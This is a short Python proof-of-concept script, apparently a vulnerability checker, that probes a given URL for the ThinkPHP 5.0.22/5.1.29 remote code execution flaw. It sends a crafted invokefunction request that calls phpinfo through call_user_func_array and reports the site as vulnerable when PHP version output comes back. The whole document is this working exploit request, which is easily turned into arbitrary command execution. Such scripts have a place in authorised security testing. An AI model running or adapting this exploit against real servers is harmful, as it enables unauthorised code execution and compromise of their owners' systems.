# -*- coding: utf-8 -*-
"""
Created on Sat May  4 00:35:15 2019

@author: hycc
"""

import requests


def test(url):
    url_params = {'function':'call_user_func_array',
              'vars[0]':'phpinfo',
              'vars[1][]':'-1'}
    temp = requests.session()
    try:
        print("[*] 正在测试 thinkphp 5022_5129  remote command execution 测试命令(phpinfo())")
        exp = temp.get(url+'/index.php?s=index/think\\app/invokefunction', params = url_params, timeout = 6)
        if "PHP Version" in exp.text:
            print("有漏洞:%s" % url)
        else:
            print("没有漏洞")
    except:
        print("测试失败")